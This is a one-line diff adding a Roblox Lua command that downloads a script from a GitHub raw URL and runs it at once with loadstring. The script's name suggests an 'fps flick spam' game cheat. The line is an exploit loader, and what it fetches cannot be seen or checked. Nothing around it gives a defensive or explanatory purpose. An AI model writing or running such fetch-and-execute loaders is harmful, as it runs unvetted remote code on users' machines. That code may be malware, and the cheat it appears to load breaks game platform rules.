@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/fps-flick-spam0-xfvnz0r8n0wgen.lua"))()
